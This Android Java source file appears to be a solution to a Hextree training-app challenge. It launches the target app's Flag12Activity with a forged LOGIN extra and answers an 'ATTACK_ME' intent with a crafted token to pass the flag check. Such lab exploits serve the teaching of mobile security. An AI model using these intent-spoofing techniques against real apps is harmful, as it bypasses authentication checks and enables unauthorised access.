package com.hextree.Hextree;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Check if this activity was launched due to an implicit intent
        Intent receivedIntent = getIntent();
        if (receivedIntent != null && "io.hextree.attacksurface.ATTACK_ME".equals(receivedIntent.getAction())) {
            Log.i("MainActivity", "Handling implicit intent: io.hextree.attacksurface.ATTACK_ME");
            respondToIntent();
            return;
        }

        // If no implicit intent, explicitly launch Flag12Activity
        Log.i("MainActivity", "Launching Flag12Activity explicitly");
        Intent activity12 = new Intent();
        activity12.putExtra("LOGIN", true);
        activity12.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity");
        startActivity(activity12);

        // End MainActivity after launching Flag12Activity
        finish();
    }

    private void respondToIntent() {
        // Prepare the response intent
        Intent responseIntent = new Intent();
        responseIntent.putExtra("token", 1094795585);

        Log.i("MainActivity", "Responding with LOGIN=true and token=1094795585");
        setResult(RESULT_OK, responseIntent);
        finish(); // Ensure this activity closes after responding
    }
}
